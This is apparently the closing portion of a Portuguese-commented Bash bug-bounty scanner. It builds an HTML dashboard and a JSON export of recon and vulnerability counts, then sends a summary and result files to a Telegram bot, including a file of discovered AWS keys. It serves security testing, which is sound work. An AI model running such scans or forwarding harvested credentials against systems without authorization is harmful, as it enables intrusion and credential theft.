          <li><a href="../urls/gf_sqli.txt">💉 SQLi Candidates</a></li>
          <li><a href="../poc/sqli/">📁 SQLi PoCs</a></li>
        </ul>
      </div>
      
      <div class="card">
        <h3>📊 Data Files</h3>
        <ul>
          <li><a href="../alive/hosts.txt">✅ Live Hosts</a></li>
          <li><a href="../urls/with_params.txt">🎯 Parameterized URLs</a></li>
          <li><a href="../apis/api_endpoints.txt">🔌 API Endpoints</a></li>
          <li><a href="../js/downloads/">📜 JS Files</a></li>
        </ul>
      </div>
      
      <div class="card">
        <h3>🔧 EXTRA TOOLS</h3>
        <ul>
          <li><a href="../reports/linkfinder/">🔗 Linkfinder Results</a></li>
          <li><a href="../reports/paramspider/">📊 Paramspider Results</a></li>
          <li><a href="../reports/secretfinder/">🔑 Secretfinder Results</a></li>
          <li><a href="../screenshots/gowitness/">📸 Gowitness Screenshots</a></li>
          <li><a href="../screenshots/aquatone/">📸 Aquatone Report</a></li>
          <li><a href="../reports/">📁 All EXTRA TOOLS</a></li>
        </ul>
      </div>
    </div>
    
    <div style="text-align:center;margin-top:40px;padding:20px;background:#f8f9fa;border-radius:10px">
      <p><strong>Enhanced Bug Bounty Scanner v2.0</strong></p>
      <p>Profile-based • Safety-first • Comprehensive coverage</p>
    </div>
  </div>
</body>
</html>
HTMLDOC

# ============= EXPORT JSON (OPCIONAL) =============
if [[ "$EXPORT_JSON" = "true" ]]; then
    log_info "Exportando resultados em JSON..."
    
    cat > reports/results.json <<-JSONEOF
{
  "scan_info": {
    "timestamp": "$(date -u -Iseconds)",
    "target_scope": "$(basename "$SCOPE_FILE")",
    "profile": "$PROFILE", 
    "mode": "$([ "$DRY_RUN" = "true" ] && echo "dry-run" || echo "active")",
    "configuration": {
      "concurrency": $CONCURRENCY,
      "rate_limit": $RATE_LIMIT,
      "parallel_hosts": $PARALLEL_HOSTS,
      "timeout_per_host": "$TIMEOUT_PER_HOST"
    }
  },
  "statistics": {
    "total_domains": $TOTAL_DOMAINS,
    "subdomains_found": $SUBS_FOUND,
    "live_hosts": $LIVE_HOSTS,
    "total_urls": $TOTAL_URLS,
    "parameterized_urls": $PARAM_URLS,
    "js_files": $JS_FILES,
    "api_endpoints": $API_ENDPOINTS,
    "ports_found": $PORTS_FOUND
  },
  "vulnerabilities": {
    "nuclei_critical": $NUCLEI_FAST_TOTAL,
    "nuclei_medium": $NUCLEI_EXT_TOTAL,
    "xss_confirmed": $DALFOX_RESULTS,
    "secrets_exposed": $TOTAL_SECRETS,
    "candidates": {
      "xss": $XSS_CANDIDATES,
      "sqli": $SQLI_CANDIDATES,
      "lfi": $LFI_CANDIDATES,
      "ssrf": $SSRF_CANDIDATES
    }
  },
  "extra_tools": {
    "xss_detection": {
      "kxss": $KXSS_RESULTS,
      "gxss": $GXSS_RESULTS
    },
    "endpoint_discovery": {
      "linkfinder": $LINKFINDER_ENDPOINTS,
      "xnLinkFinder": $XNLINKFINDER_LINKS,
      "paramspider": $PARAMSPIDER_PARAMS
    },
    "secret_scanning": {
      "secretfinder": $SECRETFINDER_SECRETS
    },
    "visual_recon": {
      "gowitness_screenshots": $GOWITNESS_SCREENSHOTS,
      "aquatone_screenshots": $AQUATONE_SCREENSHOTS
    },
    "cloud_assets": {
      "s3_buckets": $S3_BUCKETS
    }
  },
  "files": {
    "live_hosts": "alive/hosts.txt",
    "parameterized_urls": "urls/with_params.txt",
    "nuclei_results": "nuclei/",
    "secrets": "secrets/",
    "reports": "reports/",
    "screenshots": "screenshots/"
  }
}
JSONEOF
fi

# ============= TELEGRAM FINAL REPORT =============
final_telegram_report() {
    if [[ -n "$TELEGRAM_BOT_TOKEN" ]] && [[ -n "$TELEGRAM_CHAT_ID" ]]; then
        log_info "Enviando relatório final para Telegram..."
        
        # Determinar nível de alerta
        if [[ "$NUCLEI_FAST_TOTAL" -gt 5 ]] || [[ "$DALFOX_RESULTS" -gt 0 ]] || [[ "$SQLI_VALIDATED" -gt 0 ]] || [[ "$TOTAL_SECRETS" -gt 10 ]]; then
            ALERT="🔴 *HIGH RISK*"
        elif [[ "$NUCLEI_FAST_TOTAL" -gt 0 ]] || [[ "$TOTAL_SECRETS" -gt 0 ]]; then
            ALERT="🟡 *MEDIUM RISK*"  
        else
            ALERT="🟢 *LOW RISK*"
        fi
        
        FINAL_SUMMARY="$ALERT  
🎯 *Enhanced Bug Bounty Scan COMPLETE* ✅
📂 \`$(pwd | sed 's/.*\///')\`  
⏱️ Finalizado: \`$(date '+%H:%M:%S')\`
🔧 Perfil: \`$PROFILE\` | Modo: \`$([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ATIVO")\`

*📊 Attack Surface:*  
- 🌐 Subdomains: $SUBS_FOUND  
- 🟢 Live hosts: $LIVE_HOSTS  
- 🔗 URLs: $TOTAL_URLS ($PARAM_URLS com parâmetros)  
- 🚪 Portas: $PORTS_FOUND abertas
- 🔌 APIs: $API_ENDPOINTS endpoints

*🔥 Critical Findings:*  
- ⚡ Nuclei crítico: $NUCLEI_FAST_TOTAL  
- 💉 SQLi confirmada: $SQLI_VALIDATED
- ❌ XSS confirmado: $DALFOX_RESULTS
- 🔑 Secrets expostos: $TOTAL_SECRETS

*⚡ Vulnerability Candidates:*  
- ❌ XSS candidatos: $XSS_CANDIDATES (kxss: $KXSS_RESULTS, gxss: $GXSS_RESULTS)
- 💉 SQLi candidatos: $SQLI_CANDIDATES
- 📁 LFI candidatos: $LFI_CANDIDATES
- 🌐 SSRF candidatos: $SSRF_CANDIDATES
- 🔍 Médio risco: $NUCLEI_EXT_TOTAL

*🔧 EXTRA TOOLS Results:*
- 🔗 Endpoints (linkfinder): $LINKFINDER_ENDPOINTS
- 🔗 Links (xnLinkFinder): $XNLINKFINDER_LINKS
- 📊 Params (paramspider): $PARAMSPIDER_PARAMS
- 🔑 Secrets (secretfinder): $SECRETFINDER_SECRETS
- 📸 Screenshots: $((GOWITNESS_SCREENSHOTS + AQUATONE_SCREENSHOTS))
- ☁️ S3 Buckets: $S3_BUCKETS

*🎯 Next Steps:*
- Review critical Nuclei findings
- Validate XSS results from Dalfox  
- Check secrets/ directory for exposure
- Review EXTRA TOOLS reports/ folder
- Check screenshots/ for visual recon
- Manual SQLi testing if authorized
$([ "$DRY_RUN" = "true" ] && echo "- Re-run with --confirm for active scanning" || echo "")
"
        
        send_telegram_message_enhanced "$FINAL_SUMMARY" "false"
        
        # Enviar arquivos importantes
        send_file_to_telegram "reports/report.md" "Relatório completo"
        send_file_to_telegram "html/dashboard.html" "Dashboard HTML"
        
        if [[ "$NUCLEI_FAST_TOTAL" -gt 0 ]]; then
            send_file_to_telegram "nuclei/nuclei_hosts_fast.txt" "Nuclei críticos"
        fi
        
        if [[ "$TOTAL_SECRETS" -gt 0 ]]; then
            send_file_to_telegram "secrets/aws_keys.txt" "AWS keys encontradas"
        fi
    else
        log_info "Telegram não configurado"
    fi
}

send_file_to_telegram() {
    local file="$1"
    local description="$2"
    
    if [[ -f "$file" ]] && [[ -s "$file" ]]; then
        log_info "Enviando $description para Telegram..."
        telegram_rate_limit
        curl -s -m 90 -F chat_id="${TELEGRAM_CHAT_ID}" -F document=@"$file" \
             "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" >/dev/null 2>&1 || true
    fi
}

final_telegram_report

# ============= SAÍDA FINAL COLORIDA =============
echo ""
echo "============================================================"
echo "🎯 ENHANCED BUG BOUNTY SCAN COMPLETE"
echo "============================================================"
echo "📁 Resultados salvos em: $(pwd)"
echo "🔧 Perfil usado: $PROFILE"
echo "⚙️  Modo: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (apenas coleta)" || echo "ATIVO (scanning completo)")"
echo ""
echo "📊 RESUMO EXECUTIVO:"
echo "   🌐 Subdomínios: $SUBS_FOUND"
echo "   ✅ Hosts vivos: $LIVE_HOSTS"
echo "   🔗 URLs coletadas: $TOTAL_URLS ($PARAM_URLS com parâmetros)"
echo "   🔌 APIs encontradas: $API_ENDPOINTS"
echo ""
echo "🔥 VULNERABILIDADES:"
echo "   ⚡ Nuclei crítico: $NUCLEI_FAST_TOTAL"
echo "   💉 SQLi confirmada: $SQLI_VALIDATED"
echo "   ❌ XSS confirmado: $DALFOX_RESULTS"
echo "   🔑 Secrets expostos: $TOTAL_SECRETS"
echo ""
echo "🔧 EXTRA TOOLS RESULTS:"
echo "   ❌ kxss: $KXSS_RESULTS | gxss: $GXSS_RESULTS"
echo "   🔗 linkfinder: $LINKFINDER_ENDPOINTS endpoints"
echo "   🔗 xnLinkFinder: $XNLINKFINDER_LINKS links"
echo "   📊 paramspider: $PARAMSPIDER_PARAMS parâmetros"
echo "   🔑 secretfinder: $SECRETFINDER_SECRETS secrets"
echo "   📸 Screenshots: $((GOWITNESS_SCREENSHOTS + AQUATONE_SCREENSHOTS))"
echo "   ☁️ S3 buckets: $S3_BUCKETS"
echo ""
echo "📋 RELATÓRIOS:"
echo "   📄 Relatório completo: reports/report.md"  
echo "   🌐 Dashboard HTML: html/dashboard.html"
echo "   📊 Resumo rápido: reports/vuln_summary.txt"
if [[ "$EXPORT_JSON" = "true" ]]; then
echo "   📋 Export JSON: reports/results.json"
fi
echo ""
echo "🚀 PRÓXIMOS PASSOS:"
echo "   1. Revisar findings críticos do Nuclei"
if [[ "$DALFOX_RESULTS" -gt 0 ]]; then
echo "   2. ⚠️  VALIDAR XSS confirmados pelo Dalfox"
fi
if [[ "$TOTAL_SECRETS" -gt 0 ]]; then
echo "   3. 🔍 VERIFICAR secrets expostos em secrets/"
fi
if [[ "$((GOWITNESS_SCREENSHOTS + AQUATONE_SCREENSHOTS))" -gt 0 ]]; then
echo "   4. 📸 REVISAR screenshots em screenshots/"
fi
if [[ "$DRY_RUN" = "true" ]]; then
echo "   5. Re-executar com --confirm para scanning ativo"
fi
echo "   6. Revisar relatórios das EXTRA TOOLS em reports/"
echo "   7. Teste manual de candidatos SQLi/LFI/SSRF"
echo ""
echo "⚠️  LEMBRETE: Validação manual necessária antes de reportar"
echo "============================================================"

# Log final
log_info "Scan completo. Profile: $PROFILE, Mode: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")"
log_info "Total runtime: $(date -d@$(($(date +%s) - $(stat -c %Y logs/scanner.log 2>/dev/null || date +%s))) -u +%H:%M:%S 2>/dev/null || echo "N/A")"

# Salvar configuração usada para referência futura
cat > logs/scan_config.txt <<-CONFIGEOF
SCAN CONFIGURATION - $(date -u)
==============================
Profile: $PROFILE
Mode: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")
Concurrency: $CONCURRENCY
Rate Limit: $RATE_LIMIT/s
Parallel Hosts: $PARALLEL_HOSTS
Timeout per Host: $TIMEOUT_PER_HOST
CPUs Used: $NCPU
Max Crawl Depth: $MAX_CRAWL_DEPTH

Command: $0 $*

Results Directory: $(pwd)
CONFIGEOF

exit 0